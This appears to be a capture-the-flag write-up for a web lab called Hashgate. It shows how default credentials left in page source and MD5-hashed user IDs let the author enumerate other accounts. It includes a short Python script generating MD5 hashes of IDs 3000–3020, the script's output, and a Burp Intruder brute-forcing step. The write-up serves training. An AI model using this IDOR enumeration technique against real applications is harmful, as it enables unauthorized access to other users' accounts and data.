Resource : [Hashgate](https://learn.cylabacademy.org/library/750?page=1&category=1&difficulty=2)
Difficulty : medium
Type : Black box

Reference : [Crackstation](https://crackstation.net/)

The target is a login form without given credentials
<img width="1895" height="916" alt="Screenshot 2026-07-14 224835" src="https://github.com/user-attachments/assets/8ca13874-7e10-4679-a0e7-d8c2e9583d37" />

Inspecting the page source, I found default credential left on the page
<img width="833" height="907" alt="Screenshot 2026-07-14 224856" src="https://github.com/user-attachments/assets/84ec68aa-0bb9-4c5a-b4af-b0861df0f6a2" />

I use that credential to login and find out in the request, Id has been obfuscated for each user
<img width="1254" height="316" alt="Screenshot 2026-07-14 225006" src="https://github.com/user-attachments/assets/94b40004-7f5f-427f-8d09-c9f7fdab7737" />

Using crackstation in order to crack and identify the hash format
<img width="1897" height="857" alt="Screenshot 2026-07-14 225038" src="https://github.com/user-attachments/assets/2c170cca-71bf-4fa6-862c-98b3335c42fc" />

So the id is 3000 matching with the information we know, then knowing that this organisations employees scope is only 20. Therefore, I make a python script ultilising `hashlib` library to create 20 md5 hashes
```
import hashlib

numbers = [ 3000,3001,3002,3003,3004,3005,3006,3007,3008,3009,3010,3011,3012,3013,3014,3015,3016,3017,3018,3019,3020]

for num in numbers:
  print(hashlib.md5(str(num).encode()).hexdigest())
```
NOTE: Have to convet the type of each number to string format in order to convert to md5 hash

```
$ python3 so.py
e93028bdc1aacdfb3687181f2031765d
908c9a564a86426585b29f5335b619bc
d806ca13ca3449af72a1ea5aedbed26a
a4380923dd651c195b1631af7c829187
20479c788fb27378c2c99eadcf207e7f
3a61ed715ee66c48bacf237fa7bb5289
5f268dfb0fbef44de0f668a022707b86
a724b9124acc7b5058ed75a31a9c2919
c02f9de3c2f3040751818aacc7f60b74
ee16fa83c0f151ef85e617f5aa3867a6
22722a343513ed45f14905eb07621686
b1f62fa99de9f27a048344d55c5ef7a6
5a01f0597ac4bdf35c24846734ee9a76
4110a1994471c595f7583ef1b74ba4cb
77edbe5f897a5dbcde49d31bec1537b8
51be2fed6c55f5aa0c16ff14c140b187
53a1320cb5d2f56130ad5222f93da374
5d616dd38211ebb5d6ec52986674b6e4
9a96a2c73c0d477ff2a6da3bf538f4f4
a74c3bae3e13616104c1b25f9da1f11f
e4a93f0332b2519177ed55741ea4e5e7
```

Then using Burp Suite 's Intruder to execute the bruteforcing step
<img width="1561" height="759" alt="Screenshot 2026-07-14 230024" src="https://github.com/user-attachments/assets/858c7ccc-8812-4652-b4d6-fc44cb67fa5e" />
<img width="1481" height="838" alt="Screenshot 2026-07-14 224659" src="https://github.com/user-attachments/assets/7b1f8fa4-2bc4-457e-abc4-a890b1c4773d" />

happy HACKING!@$!@#$12
